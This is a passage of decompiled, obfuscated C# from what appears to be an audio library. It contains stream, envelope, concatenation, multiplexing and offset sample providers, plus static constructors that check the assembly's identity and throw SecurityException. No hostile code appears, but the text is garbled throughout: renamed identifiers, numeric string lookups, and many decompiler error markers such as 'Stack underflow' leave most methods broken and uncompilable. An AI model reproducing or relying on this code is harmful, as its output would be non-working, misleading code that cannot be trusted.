				//IL_008d: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
				try
				{
					_0003 = value;
					this._0003 = (long)(_0003.TotalSeconds * (double)this.m__0001.WaveFormat._0001) * this.m__0001;
					_0004 = this.m__0001 + this._0003;
					_007F_0002._007E_0083_0005(this, global::_0012._007E_0091_0002(this));
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public override int BlockAlign
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.BlockAlign;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override long Length => ((_000E)/*Error near IL_0007: Stack underflow*/)._0004;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0005;
			}
			set
			{
				//IL_007c: Incompatible stack heights: 0 vs 1
				//IL_0088: Incompatible stack heights: 0 vs 2
				object obj = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0018: Stack underflow*/((object)/*Error near IL_0018: Stack underflow*/);
				try
				{
					value -= value % BlockAlign;
					if (value < this.m__0001)
					{
						_007F_0002._007E_0083_0005(this.m__0001, this._0002);
					}
					else
					{
						_007F_0002._007E_0083_0005(this.m__0001, this._0002 + (value - this.m__0001));
					}
					_0005 = value;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public override global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _000E(global::_0006._0006 _0010_0090_0006, TimeSpan _0019_0080, TimeSpan _0086_0090_0006, TimeSpan _0087_0090_0006)
		{
			if (_0010_0090_0006.WaveFormat._0001 != WaveFormatEncoding.Pcm)
			{
				throw new ArgumentException(_0080._0014._0001(107386602));
			}
			this.m__0001 = _0010_0090_0006;
			_0005 = 0L;
			this.m__0001 = _0010_0090_0006.WaveFormat._0003 / 8 * _0010_0090_0006.WaveFormat._0001;
			StartTime = _0019_0080;
			SourceOffset = _0086_0090_0006;
			SourceLength = _0087_0090_0006;
		}

		public _000E(global::_0006._0006 _0010_0090_0006)
			: this(_0010_0090_0006, TimeSpan.Zero, TimeSpan.Zero, _0010_0090_0006.TotalTime)
		{
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_00e4: Incompatible stack heights: 0 vs 1
			//IL_00f0: Incompatible stack heights: 0 vs 2
			object obj = ((_000E)/*Error near IL_000a: Stack underflow*/).m__0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				int num = 0;
				if (_0005 < this.m__0001)
				{
					num = (int)_0008_0003._0087_0006(_0004, this.m__0001 - _0005);
					for (int i = 0; i < num; i++)
					{
						_0002[i + _0003] = 0;
					}
				}
				if (num < _0004)
				{
					int num2 = (int)_0008_0003._0087_0006(_0004 - num, this._0003 + this._0002 - global::_0012._007E_0091_0002(this.m__0001));
					int num3 = _0082._007E_0006_0004(this.m__0001, _0002, num + _0003, num2);
					num += num3;
				}
				for (int j = num; j < _0004; j++)
				{
					_0002[_0003 + j] = 0;
				}
				_0005 += _0004;
				return _0004;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		public override bool _0001(int _0002)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Invalid comparison between Unknown and I8
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 2
			_ = ((_000E)/*Error near IL_0007: Stack underflow*/)._0005;
			long num = (long)/*Error near IL_000a: Stack underflow*/;
			_ = /*Error near IL_000b: Stack underflow*/+ num;
			long num2 = ((_000E)/*Error near IL_0012: Stack underflow*/).m__0001;
			if ((long)/*Error near IL_0014: Stack underflow*/ < num2)
			{
				return false;
			}
			if (_0005 >= _0004)
			{
				return false;
			}
			return this.m__0001._0001(_0002);
		}

		protected override void _0001(bool _0002)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_000E)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_0004_0002;
				global::_0006._0006 obj = ((_000E)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this.m__0001 = null;
			}
			global::_0005._008A(this, _0002);
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0007
{
	internal sealed class _0007 : IDisposable
	{
		internal readonly _007F._0006 _0001;

		private readonly int m__0001;

		internal readonly byte[] _0001;

		internal readonly global::_001C._0004 _0001;

		internal readonly object _0001;

		internal GCHandle _0001;

		internal IntPtr _0001;

		internal GCHandle _0002;

		internal GCHandle _0003;

		public bool InQueue => (((_0007)/*Error near IL_0007: Stack underflow*/)._0001._0001 & global::_000E._0004._0004) == global::_000E._0004._0004;

		public int BufferSize => ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0007(IntPtr _0088_0090_0006, int _0086_0080, global::_001C._0004 _0089_0090_0006, object _008A_0090_0006)
		{
			this.m__0001 = _0086_0080;
			this._0001 = new byte[_0086_0080];
			this._0001 = GCHandle.Alloc(this._0001, GCHandleType.Pinned);
			this._0001 = _0088_0090_0006;
			this._0001 = _0089_0090_0006;
			this._0001 = _008A_0090_0006;
			this._0001 = new _007F._0006();
			this._0002 = GCHandle.Alloc(this._0001, GCHandleType.Pinned);
			this._0001._0001 = this._0001.AddrOfPinnedObject();
			this._0001._0001 = _0086_0080;
			this._0001._0003 = 1;
			_0003 = GCHandle.Alloc(this);
			this._0001._0002 = (IntPtr)_0003;
			lock (_008A_0090_0006)
			{
				global::_0011._0018._0001(global::_0011._0018._0001(_0088_0090_0006, this._0001, Marshal.SizeOf((object)this._0001)), _0080._0014._0001(107386124));
			}
		}

		protected override void _0001()
		{
			//IL_0008: Incompatible stack heights: 0 vs 2
			try
			{
				_ = 0;
				global::_0011._0018._0001((byte)/*Error near IL_000f: Stack underflow*/ != 0, (_0007)/*Error near IL_000f: Stack underflow*/);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public void _0002()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009B_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/);
			_ = 1;
			global::_0011._0018._0001((byte)/*Error near IL_0011: Stack underflow*/ != 0, (_0007)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002();
		}
	}
}
namespace _0016
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal sealed class _000F : global::_0005._0005
	{
		private new short _0001;

		private new int _0001;

		private new int _0002;

		private new int _0003;

		private new short _0002;

		private new short _0003;

		public _000F(int _008E_008F_0006, int _0090_008F_0006, int _008F_008F_0006)
			: base(_008E_008F_0006, _0090_008F_0006, _008F_008F_0006)
		{
			this._0001 = (short)_0090_008F_0006;
			switch (_008F_008F_0006)
			{
			case 1:
				_0001 = 1;
				break;
			case 2:
				_0001 = 3;
				break;
			}
			base._0001 = WaveFormatEncoding.WindowsMediaAudio;
		}
	}
}
namespace _0017
{
	internal sealed class _000F : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		internal readonly global::_001D._0014 _0001;

		private float m__0001;

		private float _0002;

		public float AttackSeconds
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0030: Incompatible stack heights: 0 vs 1
				((_000F)/*Error near IL_0009: Stack underflow*/).m__0001 = (float)/*Error near IL_0009: Stack underflow*/;
				((_000F)/*Error near IL_0010: Stack underflow*/)._0001.AttackRate = this.m__0001 * (float)WaveFormat._0001;
			}
		}

		public float ReleaseSeconds
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0030: Incompatible stack heights: 0 vs 1
				((_000F)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
				((_000F)/*Error near IL_0010: Stack underflow*/)._0001.ReleaseRate = _0002 * (float)WaveFormat._0001;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000F)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _000F(global::_0002._0007 _001D_0013)
		{
			if (_001D_0013.WaveFormat._0001 > 1)
			{
				throw new ArgumentException(global::_0080._0014._0001(107385485));
			}
			this.m__0001 = _001D_0013;
			this._0001 = new global::_001D._0014();
			AttackSeconds = 0.01f;
			this._0001.SustainLevel = 1f;
			this._0001.DecayRate = 0f * (float)WaveFormat._0001;
			ReleaseSeconds = 0.3f;
			global::_0011._0018._0001(this._0001, true);
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 2
			if (((_000F)/*Error near IL_0007: Stack underflow*/)._0001._0001 == global::_001D._0014._0001._0001)
			{
				return 0;
			}
			_ = ((_000F)/*Error near IL_0017: Stack underflow*/).m__0001;
			int num = ((global::_0002._0007)/*Error near IL_0020: Stack underflow*/)._0001((float[])/*Error near IL_0020: Stack underflow*/, _0003, _0004);
			for (int i = 0; i < num; i++)
			{
				_0002[_0003++] *= global::_0011._0018._0001(this._0001);
			}
			return num;
		}

		static _000F()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal sealed class _000E : _0007
	{
		private readonly _0007[] m__0001;

		private int m__0001;

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0014: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001[0].WaveFormat;
				return (global::_0005._0005)/*Error near IL_000c: Stack underflow*/;
			}
		}

		public _000E(IEnumerable<_0007> _008B_0090_0006)
		{
			if (_008B_0090_0006 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107385468));
			}
			this.m__0001 = _008B_0090_0006.ToArray();
			if (this.m__0001.Length == 0)
			{
				throw new ArgumentException(_0080._0014._0001(107385423), _0080._0014._0001(107385468));
			}
			if (this.m__0001.Any(delegate
			{
				//IL_0015: Invalid comparison between Unknown and I4
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 2
				_ = ((_0007)/*Error near IL_0023: Stack underflow*/).WaveFormat;
				_ = ((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0001;
				short num2 = ((_000E)/*Error near IL_0010: Stack underflow*/).WaveFormat._0001;
				return (int)/*Error near IL_0017: Stack underflow*/ != num2;
			}))
			{
				throw new ArgumentException(_0080._0014._0001(107385378), _0080._0014._0001(107385468));
			}
			if (this.m__0001.Any(delegate
			{
				//IL_0015: Invalid comparison between Unknown and I4
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 2
				_ = ((_0007)/*Error near IL_0023: Stack underflow*/).WaveFormat;
				_ = ((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0001;
				int num = ((_000E)/*Error near IL_0010: Stack underflow*/).WaveFormat._0001;
				return (int)/*Error near IL_0017: Stack underflow*/ != num;
			}))
			{
				throw new ArgumentException(_0080._0014._0001(107386927), _0080._0014._0001(107385468));
			}
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected I4, but got Unknown
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			int num = 0;
			while (num < _0004 && this.m__0001 < this.m__0001.Length)
			{
				int num2 = /*Error near IL_000a: Stack underflow*/- /*Error near IL_000a: Stack underflow*/;
				int num3 = this.m__0001[this.m__0001]._0001(_0002, num, num2);
				num += num3;
				if (num3 == 0)
				{
					this.m__0001++;
				}
			}
			return num;
		}

		[CompilerGenerated]
		private bool _0001(_0007 _0002)
		{
			//IL_0015: Invalid comparison between Unknown and I4
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 2
			_ = ((_0007)/*Error near IL_0023: Stack underflow*/).WaveFormat;
			_ = ((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0001;
			short num = ((_000E)/*Error near IL_0010: Stack underflow*/).WaveFormat._0001;
			return (int)/*Error near IL_0017: Stack underflow*/ != num;
		}

		[CompilerGenerated]
		private bool _0002(_0007 _0002)
		{
			//IL_0015: Invalid comparison between Unknown and I4
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 2
			_ = ((_0007)/*Error near IL_0023: Stack underflow*/).WaveFormat;
			_ = ((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0001;
			int num = ((_000E)/*Error near IL_0010: Stack underflow*/).WaveFormat._0001;
			return (int)/*Error near IL_0017: Stack underflow*/ != num;
		}
	}
}
namespace _000F
{
	internal sealed class _0006 : global::_0002._0007
	{
		internal enum _0001
		{
			_0001,
			_0002,
			_0003,
			_0004
		}

		internal readonly object _0001 = new object();

		internal readonly global::_0002._0007 _0001;

		internal int _0001;

		internal int _0002;

		internal _0001 _0001;

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0006(global::_0002._0007 _001D_0013, bool _008C_0090_0006 = false)
		{
			this._0001 = _001D_0013;
			this._0001 = ((!_008C_0090_0006) ? _0006._0001._0003 : _0006._0001._0001);
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_006d: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 2
			//IL_0079: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((global::_0002._0007)/*Error near IL_0011: Stack underflow*/)._0001((float[])/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, _0004);
			object obj = this._0001;
			_0091_0002._009C_0005(obj);
			try
			{
				if (this._0001 == _0006._0001._0002)
				{
					global::_0011._0018._0001(_0003, _0002, num, this);
					return num;
				}
				if (this._0001 == _0006._0001._0004)
				{
					global::_0011._0018._0001(_0003, num, _0002, this);
					return num;
				}
				if (this._0001 == _0006._0001._0001)
				{
					global::_0011._0018._0001(_0003, _0002, _0004);
					return num;
				}
				return num;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001E
{
	internal sealed class _0007 : global::_0002._0007
	{
		private readonly IList<global::_0002._0007> m__0001;

		private readonly global::_0005._0005 m__0001;

		internal readonly int _0001;

		internal readonly int _0002;

		internal readonly List<int> _0001;

		private float[] m__0001;

		public global::_0005._0005 WaveFormat => ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int InputChannelCount => ((_0007)/*Error near IL_0007: Stack underflow*/)._0002;

		public int OutputChannelCount => ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0007(IEnumerable<global::_0002._0007> _0005_0090_0006, int _0006_0090_0006)
		{
			this.m__0001 = new List<global::_0002._0007>(_0005_0090_0006);
			this._0001 = _0006_0090_0006;
			if (this.m__0001.Count == 0)
			{
				throw new ArgumentException(_0080._0014._0001(107387675));
			}
			if (_0006_0090_0006 < 1)
			{
				throw new ArgumentException(_0080._0014._0001(107387082));
			}
			foreach (global::_0002._0007 item in this.m__0001)
			{
				if (this.m__0001 == null)
				{
					if (item.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
					{
						throw new ArgumentException(_0080._0014._0001(107385829));
					}
					this.m__0001 = global::_0011._0018._0001(item.WaveFormat._0001, _0006_0090_0006);
				}
				else
				{
					if (item.WaveFormat._0003 != this.m__0001._0003)
					{
						throw new ArgumentException(_0080._0014._0001(107386980));
					}
					if (item.WaveFormat._0001 != this.m__0001._0001)
					{
						throw new ArgumentException(_0080._0014._0001(107386927));
					}
				}
				_0002 += item.WaveFormat._0001;
			}
			this._0001 = new List<int>();
			for (int i = 0; i < this._0001; i++)
			{
				this._0001.Add(i % _0002);
			}
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0179: Incompatible stack heights: 0 vs 1
			//IL_017f: Incompatible stack heights: 0 vs 1
			//IL_0185: Expected I4, but got Unknown
			int num = ((_0007)/*Error near IL_000f: Stack underflow*/)._0001;
			int num2 = /*Error near IL_0010: Stack underflow*// num;
			int num3 = 0;
			int num4 = 0;
			IEnumerator<global::_0002._0007> enumerator = this.m__0001.GetEnumerator();
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					global::_0002._0007 current = enumerator.Current;
					int num5 = num2 * current.WaveFormat._0001;
					this.m__0001 = global::_0011._0018._0001(num5, this.m__0001);
					int num6 = current._0001(this.m__0001, 0, num5);
					num4 = _0016_0002._0019_0005(num4, num6 / current.WaveFormat._0001);
					for (int i = 0; i < current.WaveFormat._0001; i++)
					{
						int num7 = num3 + i;
						for (int j = 0; j < this._0001; j++)
						{
							if (this._0001[j] != num7)
							{
								continue;
							}
							int num8 = i;
							int num9 = _0003 + j;
							int k;
							for (k = 0; k < num2; k++)
							{
								if (num8 >= num6)
								{
									break;
								}
								_0002[num9] = this.m__0001[num8];
								num9 += this._0001;
								num8 += current.WaveFormat._0001;
							}
							for (; k < num2; k++)
							{
								_0002[num9] = 0f;
								num9 += this._0001;
							}
						}
					}
					num3 += current.WaveFormat._0001;
				}
			}
			finally
			{
				if (enumerator != null)
				{
					global::_0008._007E_0098(enumerator);
				}
			}
			return num4 * this._0001;
		}
	}
}
namespace _0007
{
	internal sealed class _0008 : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		private int m__0001;

		private int _0002;

		internal int _0003;

		internal int _0004;

		private int _0005;

		internal int _0006;

		public int DelayBySamples
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_0042: Incompatible stack heights: 0 vs 1
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_0007: Stack underflow*/).m__0001 != 0)
				{
					_0080._0014._0001(107385820);
					new InvalidOperationException((string?)/*Error near IL_0049: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				if (value % WaveFormat._0001 != 0)
				{
					throw new ArgumentException(_0080._0014._0001(107385759));
				}
				_0003 = value;
			}
		}

		public TimeSpan DelayBy
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_0009: Stack underflow*/)._0003;
				((_0008)/*Error near IL_0017: Stack underflow*/)._0001(num);
				return (TimeSpan)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_000b: Stack underflow*/)._0001((TimeSpan)/*Error near IL_000b: Stack underflow*/);
				((_0008)/*Error near IL_0010: Stack underflow*/)._0003 = num;
			}
		}

		public int SkipOverSamples
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0004;
			}
			set
			{
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_0042: Incompatible stack heights: 0 vs 1
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_0007: Stack underflow*/).m__0001 != 0)
				{
					_0080._0014._0001(107385682);
					new InvalidOperationException((string?)/*Error near IL_0049: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				if (value % WaveFormat._0001 != 0)
				{
					throw new ArgumentException(_0080._0014._0001(107385621));
				}
				_0004 = value;
			}
		}

		public TimeSpan SkipOver
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_0009: Stack underflow*/)._0004;
				((_0008)/*Error near IL_0017: Stack underflow*/)._0001(num);
				return (TimeSpan)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_000b: Stack underflow*/)._0001((TimeSpan)/*Error near IL_000b: Stack underflow*/);
				((_0008)/*Error near IL_0010: Stack underflow*/)._0004 = num;
			}
		}

		public int TakeSamples
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0005;
			}
			set
			{
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_0042: Incompatible stack heights: 0 vs 1
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_0007: Stack underflow*/).m__0001 != 0)
				{
					_0080._0014._0001(107385000);
					new InvalidOperationException((string?)/*Error near IL_0049: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				if (value % WaveFormat._0001 != 0)
				{
					throw new ArgumentException(_0080._0014._0001(107384943));
				}
				_0005 = value;
			}
		}

		public TimeSpan Take
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_0009: Stack underflow*/)._0005;
				((_0008)/*Error near IL_0017: Stack underflow*/)._0001(num);
				return (TimeSpan)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_000b: Stack underflow*/)._0001((TimeSpan)/*Error near IL_000b: Stack underflow*/);
				((_0008)/*Error near IL_0010: Stack underflow*/)._0005 = num;
			}
		}

		public int LeadOutSamples
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0006;
			}
			set
			{
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_0042: Incompatible stack heights: 0 vs 1
				//IL_0049: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_0007: Stack underflow*/).m__0001 != 0)
				{
					_0080._0014._0001(107384870);
					new InvalidOperationException((string?)/*Error near IL_0049: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				if (value % WaveFormat._0001 != 0)
				{
					throw new ArgumentException(_0080._0014._0001(107385321));
				}
				_0006 = value;
			}
		}

		public TimeSpan LeadOut
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_0009: Stack underflow*/)._0006;
				((_0008)/*Error near IL_0017: Stack underflow*/)._0001(num);
				return (TimeSpan)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				int num = ((_0008)/*Error near IL_000b: Stack underflow*/)._0001((TimeSpan)/*Error near IL_000b: Stack underflow*/);
				((_0008)/*Error near IL_0010: Stack underflow*/)._0006 = num;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		private int _0001(TimeSpan _0002)
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			_ = _0002.TotalSeconds;
			_ = ((_0008)/*Error near IL_002c: Stack underflow*/).WaveFormat;
			int num = ((global::_0005._0005)/*Error near IL_000d: Stack underflow*/)._0001;
			return (int)(/*Error near IL_000f: Stack underflow*/ * (double)num) * WaveFormat._0001;
		}

		private TimeSpan _0001(int _0002)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _0003_0003._007F_0006;
			_ = ((_0008)/*Error near IL_0030: Stack underflow*/).WaveFormat;
			short num = ((global::_0005._0005)/*Error near IL_0010: Stack underflow*/)._0001;
			double num2 = (double)(/*Error near IL_0011: Stack underflow*/ / num) / (double)WaveFormat._0001;
			return /*Error near IL_0024: Stack underflow*/(num2);
		}

		public _0008(global::_0002._0007 _0002_0090_0006)
		{
			this.m__0001 = _0002_0090_0006;
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0228: Incompatible stack heights: 0 vs 1
			//IL_022e: Incompatible stack heights: 0 vs 1
			int num = 0;
			if (((_0008)/*Error near IL_0010: Stack underflow*/).m__0001 == 0)
			{
				int num2 = this.m__0001;
				((_0008)/*Error near IL_0024: Stack underflow*/).m__0001 = num2 + 1;
			}
			if (this.m__0001 == 1)
			{
				int num3 = _0016_0002._0018_0005(_0004, this._0003 - this._0002);
				for (int i = 0; i < num3; i++)
				{
					_0002[_0003 + i] = 0f;
				}
				this._0002 += num3;
				num += num3;
